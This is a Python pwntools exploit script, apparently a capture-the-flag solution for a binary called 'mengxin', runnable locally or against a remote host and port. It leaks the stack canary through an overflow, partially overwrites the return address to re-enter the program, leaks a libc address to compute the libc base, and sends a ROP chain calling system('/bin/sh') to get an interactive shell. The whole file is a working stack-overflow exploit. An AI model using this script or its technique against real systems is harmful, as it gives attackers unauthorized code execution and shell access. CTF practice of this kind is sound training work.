#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './mengxin'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget

# elf, libc

# rop1

debug()
# sla('She said: hello?\n',cyclic(40))
sea('She said: hello?\n',cyclic(41))
# sea('She said: hello?\n',cyclic(72))
ru(cyclic(41))

# log.hexdump(rc(7))
canary = uu64('\0'+rc(7))
info_addr('canary',canary)

# stack = uu64(rc(6))
# info_addr('stack',stack)

payload = cyclic(40)+p64(canary)
payload+= cyclic(24)+'\x16' # ret2csu

se(payload)

# round2
sea('She said: hello?\n',cyclic(72))
ru(cyclic(72))
libc_start_main_ret = uu64(rc(6))
if is_remote:
    libcbase = libc_start_main_ret - 0x20830
if is_local:
    libcbase = libc_start_main_ret - 243 - libc.sym['__libc_start_main']
info_addr('libcbase',libcbase)

prdi = 0x0000000000021102 + libcbase # pop rdi ; ret
system = libc.sym['system'] + libcbase
binsh = libc.search('/bin/sh').next() + libcbase

pl2 = cyclic(40)+p64(canary)
pl2+= cyclic(24)
pl2+= p64(prdi) + p64(binsh) + p64(system)
sl(pl2)
# log.warning('--------------')

p.interactive()

